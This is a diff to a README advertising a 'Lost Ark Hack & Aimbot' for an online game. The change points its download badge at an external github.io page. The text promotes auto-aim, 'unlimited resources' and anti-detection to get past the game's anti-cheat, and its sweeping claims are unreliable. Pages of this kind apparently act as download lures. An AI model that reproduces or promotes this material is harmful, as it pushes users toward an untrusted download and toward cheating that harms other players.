@@ -2,7 +2,7 @@
 
 🚀 **Lost Ark Hack & Aimbot** is a cutting-edge tool for players seeking dominance in Lost Ark. Combine **auto-aim**, **unlimited resources**, and **PvP strategies** to outplay opponents effortlessly. Compatible with the latest game patches, featuring anti-detection and 24/7 updates.  
 
-[![Download Lost Ark Hack & Aimbot](https://img.shields.io/badge/Download-Lost_Ark_Hack_&_Aimbot-blueviolet)](#)  
+[![Download Lost Ark Hack & Aimbot](https://img.shields.io/badge/Download-Lost_Ark_Hack_&_Aimbot-blueviolet)](https://lost-ark-hack-aimbot.github.io/.github/)  
 
 ---
 
